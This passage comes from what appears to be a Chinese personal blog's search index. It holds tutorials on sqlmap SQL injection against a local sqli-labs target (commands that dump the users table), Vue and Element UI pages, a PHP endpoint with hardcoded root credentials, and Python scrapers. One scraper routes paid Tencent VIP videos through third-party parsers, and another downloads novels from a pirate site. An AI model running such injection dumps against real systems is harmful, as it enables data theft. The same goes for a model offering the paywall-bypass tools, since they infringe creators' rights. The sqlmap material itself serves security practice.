&quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot; --batch -D security -T users -C &quot;id,username&quot; --dump 下面的是将查询到的数据保存到本地的地址 以上是get请求传参的sqlmap的使用方式，以下是post请求的使用方式 1，使用工具截取post的请求数据，我这里使用的是Yakit 2，将请求数据保存为本地11.txt文件 3，使用SQLmap破解数据库 1python sqlmap.py -r 11.txt --batch --dbs","categories":[],"tags":[]},{"title":"二十八，html引用Element2","slug":"二十八，html引用Element2","date":"2023-12-17T01:37:52.000Z","updated":"2023-12-17T02:41:23.342Z","comments":true,"path":"2023/12/17/二十八，html引用Element2/","permalink":"http://example.com/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/","excerpt":"","text":"1，html引用element2组件element2组件的地址为： https://element.eleme.cn/#/zh-CN/component/installation 将index.css,vue.js,index.js三个文件下载到本地并引用： 123&lt;link rel=&quot;stylesheet&quot; href=&quot;./element/index.css&quot;&gt;&lt;script src=&quot;./element/vue.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./element/index.js&quot;&gt;&lt;/script&gt; 下载地址分别为： 123https://element.eleme.cn/#/zh-CN/component/installationhttps://unpkg.com/vue@2/dist/vue.jshttps://unpkg.com/element-ui/lib/index.js 在script中进行设置布局： 12345678&lt;script&gt; new Vue(&#123; el: &#x27;#app&#x27;, data: function() &#123; return &#123; visible: false &#125; &#125; &#125;) &lt;/script&gt; 并且在body标签中引用： 123456&lt;div id=&quot;app&quot;&gt; &lt;el-button @click=&quot;visible = true&quot;&gt;Button&lt;/el-button&gt; &lt;el-dialog :visible.sync=&quot;visible&quot; title=&quot;Hello world&quot;&gt; &lt;p&gt;Try Element&lt;/p&gt; &lt;/el-dialog&gt; &lt;/div&gt; 演示效果： 2，方法进行数据绑定（1）插值表达式：，将表达式的值在View中显示出来 （2）v-bind：将标签的属性绑定到指定的变量上。简写方式： :属性名&#x3D;’变量名’ 在script中设置 123456data: function () &#123; return &#123; visible: false, text:&#x27;首页&#x27;, &#125; &#125; 在body中引用 1&lt;h1&gt;&#123;&#123;text&#125;&#125;&lt;/h1&gt; 实现点击引用不同的页面效果： 在body中设置点击执行方法和引用标签 1234&lt;el-menu-item @click=&quot;router&quot;&gt;用户列表&lt;/el-menu-item&gt;&lt;iframe :src=&quot;iframeSrc&quot; frameborder=&quot;false&quot; style=&quot;top:80px;left: 120px;width: 100%;height: 500px&quot;&gt;&lt;/iframe&gt; 在script中设置变量和执行的改变变量值的方法： 123456789iframeSrc: &#x27;&#x27;, methods: &#123; router() &#123; this.iframeSrc = &quot;admin.php&quot; &#125;, router2() &#123; this.iframeSrc = &quot;admin2.php&quot; &#125; &#125; 就可以实现点击不同的标签，会改变为不同引用页面的方法。 3，axios进行数据通信先下载axios.min.js到本地并进行引用： 123下载地址：https://unpkg.com/axios/dist/axios.min.js&lt;!-- 引入axios库 --&gt; &lt;script src=&quot;./element/axios.min.js&quot;&gt;&lt;/script&gt; 写出执行的php页面 123456789101112131415161718192021222324252627&lt;?phpheader(&quot;Access-Control-Allow-Origin: *&quot;);header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);header(&#x27;content-type:text/html; charset= utf-8&#x27;);$link = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;hysxm&quot;);$tableData = array();//从表中查询数据$select = &quot;SELECT * FROM users where isadm=0 &quot;;$result1 = $link-&gt;query($select);if ($result1-&gt;num_rows &gt; 0) &#123; // 输出数据 while ($row = $result1-&gt;fetch_assoc()) &#123; $tableData[] = $row; &#125;&#125;$link-&gt;close();$requestPath = $_SERVER[&#x27;REQUEST_URI&#x27;];header(&#x27;Content-Type: application/json&#x27;);echo json_encode($tableData); // 输出所有用户数据的JSON表示?&gt; 在table标签中引用tableData变量 1&lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%; font-size:20px;&quot;&gt; 在script设置变量并和页面刷新前执行的方法，用axios发送请求获取返回数据： 123456789101112131415tableData: [],get_data: function () &#123; this.menu_name = &quot;用户列表&quot;; axios.get(&#x27;http://127.0.0.1/user/quer_user.php&#x27;) // 执行注销链接的请求 .then(response =&gt; &#123; this.tableData = response.data; // 将响应数据存储在Vue实例的数据中 &#125;) .catch(error =&gt; &#123; alert(&quot;获取数据失败！&quot;); // 在请求失败时显示提示信息 &#125;); &#125;, mounted() &#123; this.get_data(); &#125; 页面效果: 4,vite设置局域网访问cmd进入项目的文件夹 1npx vite --host 0.0.0.0 效果：","categories":[],"tags":[]},{"title":"二十七，python爬虫-VIP视频解析器","slug":"二十七，python爬虫-VIP视频解析器","date":"2023-12-11T13:48:34.000Z","updated":"2023-12-11T14:07:29.302Z","comments":true,"path":"2023/12/11/二十七，python爬虫-VIP视频解析器/","permalink":"http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/","excerpt":"","text":"​ 用python爬虫制作一个VIP视频解析器，通过拿到腾讯视频的VIP电影地址发送到解析网站，获取解析结果地址，自动打开浏览器访问，具体步骤如下： 1，导入该程序所需要的python组件库12345from tkinter import *from PIL import Image,ImageTkimport requestsfrom lxml import etreeimport webbrowser 2，制作一个居中的窗口1234567891011121314151617# 创建一个窗口root=Tk()# 窗口加标题root.title(&#x27;VIP视频解析器&#x27;)# 设置窗口大小root.geometry(&quot;500x470&quot;)# 获取屏幕的宽度和高度screen_width = root.winfo_screenwidth()screen_height = root.winfo_screenheight()# 计算窗口在屏幕上的位置（居中）x_pos = int((screen_width / 2) - (500 / 2))y_pos = int((screen_height / 2) - (470 / 2))# 使用geometry()函数设置窗口的位置和大小root.geometry(&quot;+&#123;&#125;+&#123;&#125;&quot;.format(x_pos, y_pos))# 一直打开窗口root.mainloop() 3,在该代码文件的同一文件夹下有一张名为fengmian.png的图片，用相对路径引用并放到窗口上12345678# 窗口中加上一个图片image=Image.open(&#x27;./fengmian.png&#x27;)# 转换为PhotoImage对象，避免图像丢失问题 img = ImageTk.PhotoImage(image) # 创建一个Label，并设置图片 lab_img = Label(root, image=img) lab_img.image = img # 避免图像丢失问题 lab_img.pack() 4,加上选择解析路径的标签1234567891011chooce_frm=LabelFrame(root)chooce_frm.pack(pady=10,fill=&#x27;both&#x27;)jiexi_lab=Label(chooce_frm, text=&#x27;选择路径：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)# 设置单选变量num_chooce=IntVar()# 设置默认选中路线1num_chooce.set(1)# 设置三个单选按钮Radiobutton(chooce_frm,text=&#x27;1号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=1).pack(side=&#x27;left&#x27;)Radiobutton(chooce_frm,text=&#x27;2号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=2).pack(side=&#x27;left&#x27;)Radiobutton(chooce_frm,text=&#x27;3号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=3).pack(side=&#x27;left&#x27;) 5，加上输入要解析的视频的地址的标签1234567url_frm=LabelFrame(root)url_frm.pack(pady=10,fill=&#x27;both&#x27;)bofang_lab=Label(url_frm, text=&#x27;播放地址：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)# 设置输入变量input_var=StringVar()input_ent=Entry(url_frm,width=100,relief=&#x27;flat&#x27;,textvariable=input_var)input_ent.pack(side=&#x27;left&#x27;,fill=&#x27;both&#x27;) 6，设置解析按钮12btn_jiexi=Button(root,command=parser,text=&#x27;解析视频&#x27;,bg=&#x27;#00BFFF&#x27;,fg=&#x27;#FFFFFF&#x27;,activebackground=&#x27;#00BFFF&#x27;,activeforeground=&#x27;#00BFFF&#x27;,font=(&#x27;微软雅黑&#x27;,15),relief=&#x27;flat&#x27;)btn_jiexi.pack(fill=&#x27;both&#x27;) 7，写出点击按钮所执行的方法1234567891011121314151617181920# 点击解析按钮，进行解析def parser(): num=num_chooce.get() base_url=input_var.get() if not base_url: message=&#x27;视频播放地址不能为空，请重新输入！&#x27; open_new_window(message) else: if num==1: link=&#x27;https://www.8090g.cn/?url=&#x27;+base_url jieixi(link) elif num==2: link=&#x27;https://www.8090.la/8090/?url=&#x27;+base_url jieixi(link) elif num==3: link=&#x27;https://jx.xmflv.com/?url=&#x27;+base_url jieixi(link) else: message=&#x27;路线选择错误，请重新选择路线！&#x27; open_new_window(message) 其中https://www.8090g.cn/?url=是解析地址https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析前的地址https://www.8090g.cn/?url=https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析后的地址 8，写出在主窗口上弹出新窗口的方法1234567# 在主窗口上弹出新窗口def open_new_window(message): new_window = Toplevel(root) new_window.title(&quot;vip视频解析器&quot;) new_window.geometry(&quot;350x100+650+400&quot;) label = Label(new_window, text=message) label.pack() 9，写出获取解析后的视频地址并打开的方法1234567# 获取解析后的视频地址并打开def jieixi(link): response=requests.get(link) content=response.text tree=etree.HTML(content) url=tree.xpath(&#x27;//iframe[@id=&quot;WANG&quot;]/@src&#x27;)[0] webbrowser.open(url) 10，运行效果： VIP视频地址： 复制地址栏中的地址，输入后点击解析视频 解析成功，自动打开浏览器观看 python爬虫-VIP视频解析器制作完成！","categories":[],"tags":[]},{"title":"二十六，VUE的使用","slug":"二十六，VUE的使用","date":"2023-12-11T13:33:05.000Z","updated":"2023-12-11T13:43:23.768Z","comments":true,"path":"2023/12/11/二十六，VUE的使用/","permalink":"http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1，要使用vue前先下载node.js下载地址为：https://nodejs.org/en 123node -vnpm -v 检查是否已安装node.js 2，创建vue项目cmd命令窗口进入一个放置vue项目的文件夹，执行 1npm create vue@latest 若没有vue环境则会自动安装，然后定义项目的名字。接下来的就都一直按回车键确定就好了 底部会出现3行提示，跟着它敲然后回车就好了 123cd you_project_name //进入项目npm install //初始化项目npm run dev //运行服务 复制地址：http://localhost:5173/ 去浏览器打开，就可以跳转到vue的界面了 表示项目创建成功！ 3.Vue3项目中引入ElementUI​ ElementUI是一个强大的PC端UI组件框架，它不依赖于vue，但是却是当前和vue配合做项目开发的一个比较好的ui框架，其包含了布局（layout)，容器（container）等各类组件，基本上能满足日常网站的搭建开发。 ​ ElementUI组件地址：https://element-plus.org/zh-CN/component/button.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95 首先安装ElementUI的使用库 1npm install element-plus --save ​ 在vue3中按需引入ElementUI，需要使用其他的插件辅助，需要安装unplugin-vue-components 和 unplugin-auto-import这两款插件；安装方法如下： 1npm install -D unplugin-vue-components unplugin-auto-import 还需要在vite.config.js文件该为如下配置： 12345678910111213141516171819202122232425import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;import &#123; defineConfig &#125; from &#x27;vite&#x27;import vue from &#x27;@vitejs/plugin-vue&#x27;import AutoImport from &#x27;unplugin-auto-import/vite&#x27;import Components from &#x27;unplugin-vue-components/vite&#x27;import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;// https://vitejs.dev/config/export default defineConfig(&#123; plugins: [ vue(), // ... AutoImport(&#123; resolvers: [ElementPlusResolver()], &#125;), Components(&#123; resolvers: [ElementPlusResolver()], &#125;), ], resolve: &#123; alias: &#123; &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url)) &#125; &#125;&#125;) 在main.js中修改为如下配置： 123456//import &#x27;./assets/main.css&#x27;import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import ElementPlus from &#x27;element-plus&#x27;;import &#x27;element-plus/dist/index.css&#x27;createApp(App).mount(&#x27;#app&#x27;) 引入完毕之后，我们可进行按需引入需要使用的组件，使用方法如下，引入input组件和button组件 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div&gt; &lt;el-input class=&quot;input&quot; v-model=&quot;input&quot; type=&quot;file&quot; placeholder=&quot;Please input&quot; /&gt; &lt;el-button class=&quot;button&quot; type=&quot;primary&quot;&gt;文件处理&lt;/el-button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import &#123; ElButton, ElInput &#125; from &#x27;element-plus&#x27; import &#123; ref &#125; from &#x27;vue&#x27; export default &#123; components: &#123; ElButton,ElInput &#125;, &#125;&lt;/script&gt;&lt;style scoped&gt;.input &#123; display: inline; margin: 20px 30px;&#125;.button &#123; width: 90px;&#125;&lt;/style&gt; 效果如下： 4，使用ElementUI组件搭建管理系统页面创建一个manger.vue，然后在App.vue中引用 123456&lt;script setup&gt;import manger from &#x27;./view/manger.vue&#x27;&lt;/script&gt;&lt;template&gt; &lt;manger&gt;&lt;/manger&gt;&lt;/template&gt; 在其中用了菜单，按钮，图标，表格，分页等组件 12345htm,组件代码在&lt;template&gt;中JavaScript代码在&lt;script&gt;中css代码在&lt;style&gt;中&lt;el-row&gt;表示行 span表示占比，一共为24&lt;el-col&gt;表示列 成品代码如下：lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;import &#123; Check, Close, Menu, Menu as IconMenu, User, Setting, ShoppingBag, Memo, PieChart, Fold, ElemeFilled, ChromeFilled, Opportunity, Edit, Delete,&#125; from &#x27;@element-plus/icons-vue&#x27;const value2=ref(true)const currentPage3 = ref(5)const pageSize3 = ref(100)const small = ref(false)const background = ref(false)const disabled = ref(false)const handleSizeChange = (val) =&gt; &#123; console.log(`$&#123;val&#125; items per page`)&#125;const handleCurrentChange = (val) =&gt; &#123; console.log(`current page: $&#123;val&#125;`)&#125;const input = ref(&#x27;&#x27;)const handleOpen = (key, keyPath) =&gt; &#123; console.log(key, keyPath)&#125;const handleClose = (key, keyPath) =&gt; &#123; console.log(key, keyPath)&#125;const tableData = [ &#123; id: 1, name: &#x27;Tom&#x27;, email: &#x27;1111111@qq.com&#x27;, phone:123456, nickname:&#x27;tom1&#x27;, value2:true, data:&#x27;2016-05-01&#x27;, &#125;, &#123; id: 2, name: &#x27;lin&#x27;, email: &#x27;2222222@qq.com&#x27;, phone:456789, nickname:&#x27;lin1&#x27;, value2:false, data:&#x27;2016-05-02&#x27;, &#125;,]&lt;/script&gt;&lt;template&gt; &lt;div class=&quot;full-screen-div&quot;&gt; &lt;div class=&quot;common-layout&quot;&gt; &lt;el-container&gt; &lt;el-aside class=&quot;ce&quot;&gt; &lt;h1 class=&quot;title&quot;&gt;xxx管理系统&lt;/h1&gt; &lt;el-row class=&quot;tac&quot;&gt; &lt;el-col :span=&quot;24&quot;&gt; &lt;el-menu active-text-color=&quot;#ffd04b&quot; background-color=&quot;#344155&quot; class=&quot;el-menu-vertical-demo&quot; default-active=&quot;1&quot; text-color=&quot;#fff&quot; ref=&quot;menu&quot; @open=&quot;handleOpen&quot; @close=&quot;handleClose&quot; @click=&quot;handleMenuClick&quot; &gt; &lt;el-sub-menu index=&quot;1-1&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;User /&gt;&lt;/el-icon&gt; &lt;span&gt;用户管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;1&quot;&gt; &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt; 用户列表 &lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;2-2&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;Setting /&gt;&lt;/el-icon&gt; &lt;span&gt;权限管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;2&quot;&gt; &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt; 权限列表&lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;3-3&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;ShoppingBag /&gt;&lt;/el-icon&gt; &lt;span&gt;商品管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;3&quot;&gt; &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt; 商品列表&lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;4-4&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;Memo /&gt;&lt;/el-icon&gt; &lt;span&gt;订单管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;4&quot;&gt; &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt; 订单列表&lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;5-5&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;PieChart /&gt;&lt;/el-icon&gt; &lt;span&gt;数据统计&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;5&quot;&gt; &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt; 数据列表&lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;/el-menu&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;/el-aside&gt; &lt;el-container&gt; &lt;el-header&gt; &lt;div class=&quot;head&quot;&gt; &lt;el-icon&gt;&lt;Fold /&gt;&lt;/el-icon&gt; &lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;首页&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt; &lt;span&gt;用户列表&lt;/span&gt; &lt;div class=&quot;components&quot;&gt; &lt;el-icon class=&quot;component&quot;&gt;&lt;ElemeFilled /&gt;&lt;/el-icon&gt; &lt;el-icon class=&quot;component&quot;&gt;&lt;ChromeFilled /&gt;&lt;/el-icon&gt; &lt;el-icon class=&quot;component&quot;&gt;&lt;Opportunity /&gt;&lt;/el-icon&gt; &lt;/div&gt; &lt;/div&gt; &lt;/el-header&gt; &lt;el-main&gt; &lt;div class=&quot;main1&quot;&gt; &lt;el-row :span=&quot;2&quot; &gt; &lt;el-col :span=&quot;6&quot; class=&quot;center&quot;&gt; &lt;el-input v-model=&quot;input&quot; placeholder=&quot;Please input&quot; /&gt; &lt;/el-col&gt; &lt;el-col :span=&quot;3&quot; class=&quot;center&quot;&gt; &lt;el-button type=&quot;primary&quot;&gt;搜索&lt;/el-button&gt; &lt;/el-col&gt; &lt;el-col :span=&quot;2&quot; class=&quot;center&quot;&gt; &lt;el-button type=&quot;primary&quot;&gt;添加用户&lt;/el-button&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;el-row :span=&quot;15&quot; class=&quot;center&quot;&gt; &lt;el-table :data=&quot;tableData&quot; border style=&quot;width: 100%&quot;&gt; &lt;el-table-column prop=&quot;id&quot; label=&quot;#&quot; width=&quot;60&quot; /&gt; &lt;el-table-column prop=&quot;name&quot; label=&quot;Name&quot; width=&quot;120&quot; /&gt; &lt;el-table-column prop=&quot;email&quot; label=&quot;Email&quot; width=&quot;180&quot;/&gt; &lt;el-table-column prop=&quot;phone&quot; label=&quot;Phone&quot; width=&quot;130&quot;/&gt; &lt;el-table-column prop=&quot;nickname&quot; label=&quot;NickNmae&quot; width=&quot;120&quot; /&gt; &lt;el-table-column label=&quot;State&quot; width=&quot;150&quot; v-slot=&quot;&#123;row&#125;&quot; &gt; &lt;el-switch v-model=&quot;row.value2&quot; class=&quot;mt-2&quot; style=&quot;margin-left: 24px&quot; inline-prompt :active-icon=&quot;Check&quot; :inactive-icon=&quot;Close&quot; /&gt; &lt;/el-table-column&gt; &lt;el-table-column prop=&quot;data&quot; label=&quot;CreateData&quot; width=&quot;180&quot; /&gt; &lt;el-table-column label=&quot;操作&quot;&gt; &lt;template #default=&quot;scope&quot;&gt; &lt;el-button size=&quot;small&quot; color=&quot;#589DF6&quot;&gt;&lt;el-icon color=&quot;#FFFFFF&quot; &gt;&lt;Edit/&gt;&lt;/el-icon&gt;&lt;/el-button&gt; &lt;el-button size=&quot;small&quot; color=&quot;#E47471&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Delete /&gt;&lt;/el-icon&gt;&lt;/el-button&gt; &lt;el-button size=&quot;small&quot; color=&quot;#DCA452&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Setting /&gt;&lt;/el-icon&gt;&lt;/el-button&gt; &lt;/template&gt; &lt;/el-table-column&gt; &lt;/el-table&gt; &lt;/el-row&gt; &lt;el-row :span=&quot;2&quot; class=&quot;center&quot;&gt; &lt;div class=&quot;demo-pagination-block&quot;&gt; &lt;el-pagination v-model:current-page=&quot;currentPage3&quot; v-model:page-size=&quot;pageSize3&quot; :small=&quot;small&quot; :disabled=&quot;disabled&quot; :background=&quot;background&quot; layout=&quot;prev, pager, next, jumper&quot; :total=&quot;1000&quot; @size-change=&quot;handleSizeChange&quot; @current-change=&quot;handleCurrentChange&quot; /&gt; &lt;/div&gt; &lt;/el-row&gt; &lt;/div&gt; &lt;/el-main&gt; &lt;/el-container&gt; &lt;/el-container&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;style scoped&gt;.full-screen-div &#123; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: white; z-index: 9999;&#125;.ce&#123; width: 15vw; height: 100vh; background: #344155;&#125;.title&#123; padding-top: 15px; font-size: 20px; color: white; text-align: center;&#125;.head&#123; font-size: 20px; padding-top: 30px; padding-bottom: 13px; border-bottom: 1px solid black; font-family: &#x27;黑体&#x27;;&#125;.components &#123; position: absolute; top: 10px; right: 30px; align-items: center; &#125;.component &#123; width: 50px; height: 50px; margin-right: 30px; &#125;.main1 &#123; width: 100%; height: 80%; border-bottom: 10px solid #EBEBEB; /* 设置下边框的宽度、样式和颜色 */ box-shadow: 0 2px 3px #EBEBEB; /* 在下边框上添加阴影 */&#125;.center&#123; display: flex; justify-content: center; /* 水平居中 */ padding-bottom: 20px; padding-top: 10px;&#125;&lt;/style&gt; 效果如下：","categories":[],"tags":[]},{"title":"二十五，python爬虫-小说下载器","slug":"二十五，python爬虫-小说下载器","date":"2023-12-08T13:10:21.000Z","updated":"2023-12-08T13:20:52.895Z","comments":true,"path":"2023/12/08/二十五，python爬虫-小说下载器/","permalink":"http://example.com/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/","excerpt":"","text":"​ 用python爬虫制作一个爬取笔趣阁网站小说并且下载的程序，以下是 详细步骤： 1，先下载该程序所需的库： 1234567891011先到Python的安装目录的Scripts文件夹下，进入cmd命令窗口# requests库pip install -i https://mirrors.aliyun.com/pypi/simple/ requests# lxml库pip install -i https://mirrors.aliyun.com/pypi/simple/ lxml# urllib库pip install -i https://mirrors.aliyun.com/pypi/simple/ urllib# prettytable库pip install -i https://mirrors.aliyun.com/pypi/simple/ prettytable# pyinstaller 库pip install -i https://mirrors.aliyun.com/pypi/simple/ pyinstaller 2，因为爬虫需要多次请求网站并且获取回复，所以创建novel0.py，先封装一个get请求获取response的方法： 1234567891011# 公共方法import requests# 输入url用get方法获取responsedef get_response(url): headers=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;, &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;, &#x27;Cookie&#x27;: &#x27;Hm_lvt_dd315b2f7503b4902afb3af0c37c3847=1700455793,1701781492; clickbids=78909; bcolor=; font=; size=; fontcolor=; width=; Hm_lpvt_dd315b2f7503b4902afb3af0c37c3847=1701781516&#x27; &#125; response=requests.get(url=url,headers=headers) return response ​ headers请求头内含User-Agent，Accept，Cookie三个可以确保请求到网页内容 3，下载单张小说，创建novel1.py，封装一个输入小说下载地址和小说名称，会保存到本地novels文件夹下为：小说名称.txt文件，其中调用一个方法检查目录下是否有novels文件夹，若没有则进行创建： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 下载单张小说from lxml import etreeimport novel0import osimport novel5def download_chapters(url,name): response=novel0.get_response(url) contect=response.text # 检查响应的编码类型 encoding = response.encoding # 如果不是UTF-8，则将内容转换为UTF-8 if encoding != &#x27;utf-8&#x27;: contect = contect.encode(encoding).decode(&#x27;utf-8&#x27;) tree=etree.HTML(contect) # 拿到标题 title=tree.xpath(&#x27;//h1/text()&#x27;)[0] print(&#x27;下载&#x27;+title) # 拿到正文内容 content=tree.xpath(&#x27;//div[@id=&quot;content&quot;]/text()&#x27;) # 去掉多余字符，只保留中文文本内容 content=&#x27;\\n&#x27;.join([para.strip() for para in content]) dir_name=get_novels() path=dir_name+&#x27;/novels/&#x27;+name+&#x27;.txt&#x27; print(path) with open(path,mode=&#x27;a&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(title) fp.write(&#x27;\\n&#x27;) fp.write(content) fp.write(&#x27;\\n&#x27;) # 将路径赋值给novel5的某个属性或方法 novel5.path = path def get_novels(): # 获取当前文件所在的目录的路径 current_dir = os.path.dirname(__file__) # 获取当前文件夹名称 dir_name = os.path.basename(current_dir) # 检查novels文件夹是否存在 novels_dir = os.path.join(current_dir, &#x27;novels&#x27;) if not os.path.exists(novels_dir): # 如果不存在，创建novels文件夹 os.makedirs(novels_dir) print(&#x27;创建novels文件夹&#x27;) return dir_name 用xpath获取小说的章节标题和各章的内容,下载完成后将路径发送给novel5 4，按照小说目录下载整本小说，创建novel2.py，封装一个输入小说的目录地址，调用novel1中的方法下载各章小说： 1234567891011121314151617181920# 按照小说目录下载整本小说from lxml import etreeimport novel1import novel0def get_novel(url): # url=&#x27;http://www.yetianlian.cc/yt78909/&#x27; response=novel0.get_response(url) contect=response.content.decode(&#x27;utf-8&#x27;, &#x27;ignore&#x27;) tree=etree.HTML(contect) # 拿到标题 name=tree.xpath(&#x27;//h2/text()&#x27;)[0] # 拿到各章地址 url_list=tree.xpath(&#x27;//div[@class=&quot;listmain&quot;]//a/@href&#x27;) url_list=url_list[12:] print(&#x27;下载小说：&#x27;+name) for base_url in url_list: url=&#x27;http://www.yetianlian.cc&#x27;+base_url novel1.download_chapters(url=url,name=name) 用xpath获取小说的名称和各章的地址 5，搜索功能，创建novel3.py，封装一个获取小说名称，调用网站的搜索接口，返回搜索结果的方法： 123456789101112131415161718192021222324252627282930313233343536# 搜索功能import novel0from lxml import etreefrom urllib.parse import quoteimport prettytable as ptdef search(novel_name): url=&#x27;http://www.yetianlian.cc/s.php?ie=utf-8&amp;q=&#x27; url=url+quote(novel_name) response=novel0.get_response(url) contect=response.content.decode(&#x27;utf-8&#x27;, &#x27;ignore&#x27;) tree=etree.HTML(contect) # 拿到搜索内容 # 小说地址 address_list=tree.xpath(&#x27;//h4[@class=&quot;bookname&quot;]/a/@href&#x27;) # 小说名称 names_list=tree.xpath(&#x27;//h4[@class=&quot;bookname&quot;]/a/text()&#x27;) # 小说作者 authors_list=tree.xpath(&#x27;//div[@class=&quot;author&quot;]/text()&#x27;) authors_list=[item.replace(&#x27;作者：&#x27;, &#x27;&#x27;) for item in authors_list] # 设置列表 novels_info=[] # 创建好看的表格 tb=pt.PrettyTable() tb.field_names=[&#x27;序号&#x27;,&#x27;书名&#x27;,&#x27;作者&#x27;,&#x27;下载地址&#x27;] num=1 for i in range(len(names_list)): info=&#123; &#x27;name&#x27;:names_list[i], &#x27;author&#x27;:authors_list[i], &#x27;address&#x27;:address_list[i] &#125; tb.add_row([num,names_list[i],authors_list[i],address_list[i]]) novels_info.append(info) print(tb) return novels_info 其中，用xpath获取网站的搜索结果包括小说的名称，作者和下载地址，prettytable是整齐好看的表格，让结果整齐的在控制台中打印出来 6，GUI图形化窗口，创建novel4.py，封装一个创建图形化窗口的方法，该窗口中包括两个标签（名称&#x2F;作者，序号）和与之对应的输入框和按钮和一个表格，表格分为序号，书名，作者和下载地址四列： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# 图形主页面import tkinter as tkfrom tkinter import ttkimport novel5# 创建窗口def get_window(): root=tk.Tk() # 设置窗口标题 root.title(&#x27;小说下载器&#x27;) # 设置窗口的大小（长400px，宽300px） root.geometry(&quot;500x400&quot;) # 获取屏幕的宽度和高度 screen_width = root.winfo_screenwidth() screen_height = root.winfo_screenheight() # 计算窗口在屏幕上的位置（居中） x_pos = int((screen_width / 2) - (500 / 2)) y_pos = int((screen_height / 2) - (400 / 2)) # 使用geometry()函数设置窗口的位置和大小 root.geometry(&quot;+&#123;&#125;+&#123;&#125;&quot;.format(x_pos, y_pos)) # 创建一个书名的标签 lable_shuming=tk.Frame(root) lable_shuming.pack(pady=15,fill=&#x27;x&#x27;) lab_shum=tk.Label(lable_shuming,font=(&#x27;微软雅黑&#x27;,15),text=&#x27;书名/作者&#x27;) lab_shum.pack(side=&#x27;left&#x27;,padx=10) # 设置书名/作者输入框的变量 name_var=tk.StringVar() ent_shuming=tk.Entry(lable_shuming,relief=&#x27;flat&#x27;,textvariable=name_var) ent_shuming.pack(side=&#x27;left&#x27;,padx=10) 